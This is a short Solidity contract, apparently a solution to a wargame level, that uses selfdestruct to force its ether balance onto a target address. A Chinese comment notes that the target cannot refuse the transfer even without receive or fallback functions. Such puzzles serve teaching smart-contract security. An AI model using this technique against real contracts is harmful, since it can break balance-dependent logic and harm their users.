// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract ForceRun {
    function destory(address _levelAddress) external payable {
        //selfdestruct指定的地址，就算没有receive/fallback也是无法拒接把balance转给它
        selfdestruct(payable(_levelAddress));
    }
}